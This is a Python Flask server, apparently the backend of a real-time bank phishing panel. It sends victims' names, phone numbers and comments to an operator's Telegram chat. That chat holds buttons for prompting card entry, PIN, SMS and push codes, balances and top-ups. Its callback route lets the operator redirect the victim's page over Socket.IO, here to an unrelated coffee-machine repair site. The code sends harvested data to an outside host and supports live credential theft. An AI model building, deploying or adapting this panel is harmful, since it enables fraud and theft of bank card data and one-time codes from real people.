import os
import time
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO

# Инициализация Flask
app = Flask(__name__)
CORS(app)  # Разрешаем запросы с других доменов
socketio = SocketIO(app, cors_allowed_origins="*")

# Загружаем переменные окружения
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not TELEGRAM_BOT_TOKEN or not CHAT_ID:
    print("❌ Ошибка: TELEGRAM_BOT_TOKEN или CHAT_ID не загружены!")

print(f"🔹 Загружен TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:5]}...")
print(f"🔹 Загружен CHAT_ID (тип {type(CHAT_ID)}): {CHAT_ID}")

# 📩 Отправка данных в Telegram
@app.route('/send-to-telegram', methods=['POST'])
def send_to_telegram():
    """Принимает данные от клиента и отправляет их в Telegram"""
    try:
        data = request.json
        print(f"📩 Получены данные: {data}")

        if TELEGRAM_BOT_TOKEN is None or CHAT_ID is None:
            return jsonify({"error": "Ошибка сервера: переменные окружения не загружены"}), 500

        user_id = str(int(time.time()))
        user_info = f"📩 Новый запрос:\n\nИмя: {data.get('name', 'Не указано')}\nТелефон: {data.get('phone', 'Не указано')}\nКомментарий: {data.get('comment', 'Нет')}"

        # ✅ Создаём кастомное меню
        keyboard = {
            "inline_keyboard": [
                [{"text": "SMS", "callback_data": f"redirect_sms:{user_id}"}, {"text": "Пуш", "callback_data": f"push:{user_id}"},
                 {"text": "Ввод карты", "callback_data": f"card:{user_id}"}, {"text": "PIN", "callback_data": f"pin:{user_id}"}],
                
                [{"text": "Лимиты", "callback_data": f"limits:{user_id}"}, {"text": "Неверный код", "callback_data": f"wrong_code:{user_id}"},
                 {"text": "Номер телефона", "callback_data": f"phone_number:{user_id}"}],
                
                [{"text": "Свой текст/фото", "callback_data": f"custom_text:{user_id}"}],
                
                [{"text": "Пополнение", "callback_data": f"topup:{user_id}"}, {"text": "Баланс", "callback_data": f"balance:{user_id}"}],
                
                [{"text": "✅ Успех", "callback_data": f"success:{user_id}"}, {"text": "❌ Неверный ЛК", "callback_data": f"wrong_lk:{user_id}"}]
            ]
        }

        payload = {
            "chat_id": CHAT_ID,
            "text": user_info,
            "reply_markup": keyboard
        }

        print(f"📩 Отправляем в Telegram: {payload}")

        response = requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=payload)
        
        print(f"📩 Ответ от Telegram: {response.status_code}, {response.text}")

        if response.status_code != 200:
            return jsonify({"error": "Ошибка при отправке в Telegram", "telegram_response": response.text}), 500

        return jsonify({"status": "✅ Данные отправлены оператору"})

    except Exception as e:
        print(f"❌ Ошибка сервера: {str(e)}")
        return jsonify({"error": f"❌ Ошибка сервера: {str(e)}"}), 500

# 📩 Обработка нажатий кнопок в боте
@app.route('/callback', methods=['POST'])
def handle_callback():
    """Обрабатывает нажатие кнопок в боте"""
    try:
        data = request.json
        print(f"📩 Получен callback от Telegram: {data}")

        if "callback_query" not in data:
            return jsonify({"error": "callback_query отсутствует"}), 400

        callback_query = data["callback_query"]
        callback_data = callback_query.get("data")
        chat_id = callback_query["message"]["chat"]["id"]

        if not callback_data:
            return jsonify({"error": "Отсутствует data"}), 400

        action, user_id = callback_data.split(":")

        if action == "redirect_sms":
            print(f"✅ Оператор выбрал SMS для пользователя {user_id}")
            socketio.emit('redirect', {'user_id': user_id, 'url': "https://www.cikava-kava.com.ua/remont-kavomashyn-dnipro/"})
            response_text = "📩 SMS отправлено! Страница клиента обновится."

        elif action == "success":
            response_text = "✅ Успешно выполнено!"

        elif action == "wrong_lk":
            response_text = "❌ Ошибка: Неверный личный кабинет."

        elif action in ["push", "card", "pin", "limits", "wrong_code", "phone_number", "custom_text", "topup", "balance"]:
            response_text = f"ℹ️ Оператор выбрал: {action.replace('_', ' ').capitalize()}."

        else:
            return jsonify({"error": "Неизвестная команда"}), 400

        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": response_text
        }

        response = requests.post(telegram_url, json=payload)
        print(f"📩 Ответ от Telegram: {response.status_code}, {response.text}")

        return jsonify({"message": "✅ Callback обработан!"})

    except Exception as e:
        print(f"❌ Ошибка сервера: {str(e)}")
        return jsonify({"error": f"❌ Ошибка сервера: {str(e)}"}), 500

# Запуск сервера
if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), allow_unsafe_werkzeug=True, debug=True)
